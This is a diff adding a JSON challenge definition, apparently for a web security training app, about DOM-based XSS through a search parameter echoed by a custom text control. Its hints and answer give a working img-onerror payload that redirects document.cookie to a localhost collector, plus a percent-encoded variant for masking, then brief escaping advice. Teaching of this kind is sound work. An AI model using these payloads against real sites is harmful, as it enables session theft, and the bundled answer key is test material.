@@ -1,0 +1,26 @@
+{
+  "title": "DOM-based XSS",
+  "category": "XSS", 
+  "task": "<p>Modify the application <a href='./webapp/test/testService.html#/?searchTerm=Bike' target='_blank'>starting URL</a> in a way that causes a script to be inserted and executed when the user loads the app from your modified url.</p><p>The inserted script can simply alert() or send the user session cookie to <a target='_blank' href='http://localhost:3001/api/attack/collect?coolkie='>http://localhost:3001/api/attack/collect?coolkie=</a></p>",
+  "hints": [
+    "<p>Exploit a vulnerability of a custom control of the application named <b>custom.Text</b></p>",
+    "<p>Find <b>which</b> token from the given starting URL is directly echoed as text in the page<p>Modify its values to see how it is echoed in the page.</p>",
+    "<p>Check where the value of the <b>'searchTerm'</b> query parameter is echoed in the page text. ",
+    "<p>Can you provide a value of the <b>'searchTerm'</b> query parameter that would cause script execution when the value is inserted to the DOM?",
+    "<p>The most direct way to insert script would be to specify searchTerm=<b>&lt;script&gt;here_goes_my_script&lt;/script&gt;</b><p>However, the router sanitizes script tags. <p>In what <b>other</b> way a javascript can be attached to a DOM element?",
+    "<p>Consider example DOM element &lt;img src=\"myImage.png\" <b>onload</b>=\"myJavascriptThatExecutesOnLoadEvent\" <b>onerror</b>=\"myJavascriptThatExecutesOnErrorEvent\"/&gt; <p>where either <b>onload</b> or <b>onerror</b> trigger, depending on the validity of the provided src",
+    "<p>You can use img (as shown) or any other element that supports such inline <b>eventListener</b> definition. <p>If you only also manage to trigger the event for the eventListener => your javascript will be executed.",
+    "<p>Try to supply searchTerm=<b>Bike&lt;img src=\"\" onerror=\"alert(1)\"/&gt;</b>",
+    "<p>The alert showed => the only left is to specify javascript code that sends the session cookie to the attacker URL (as query parameter)",
+    "<p>The code can change window.location to the attacker URL http://localhost:3001/api/attack/collect?coolkie= <p>and append the value of document.cookie to it (as query parameter) <p>=> this will append the session cookie to the URL <p>=> the cookie will leak"
+  ],
+  "answer": "<p><b>To exploit:</b> <p>A successfull attack will be a URL like <span style='color:red'>/webapp/test/testService.html#/?searchTerm=Bike&lt;img src=&quot;&quot; onerror=\"window.location='http://localhost:3001/api/attack/collect?coolkie='+document.cookie\"/&gt;</span> </p><p><b>Firther:</b><p>You can use <a href='https://en.wikipedia.org/wiki/Percent-encoding'>URL percent encoding</a> to mask some of the the characters, so the same URL can be <span style='color:red'>/webapp/test/testService.html#/?searchTerm=BikeBike%3Cimg%20src%3D%22%22%20onerror%3D%22window%2Elocation%3D%27http%3A%2F%2Flocalhost%3A3001%2Fapi%2Fattack%2Fcollect?coolkie%3D%27%2Bdocument%2Ecookie%22%2F%3E</span> <p>This attack works because the custom control <a href='./webapp/custom/Text.js' target='_blank'>custom.Text</a> outputs the value provided as <b>seachTerm</b> to the DOM <b>but</b> does not encode it as text before adding it to the DOM. <p><b>To fix:</b> <p>Escape all the special characters like &lt; and &gt; etc. so that the browser does not interpret them anymore as markup (e.g. &lt; as start of tag), but only as text to be passively rendered.</p><p><img src='img/answer1.PNG'/></p>",
+  "app": {
+    "mainURL": "./webapp/test/testService.html#/?searchTerm=Bike",
+    "editURL": "./webapp/custom/Text.js"
+  },
+  "score": {
+    "success": 10,
+    "answer": 5
+  }
+}
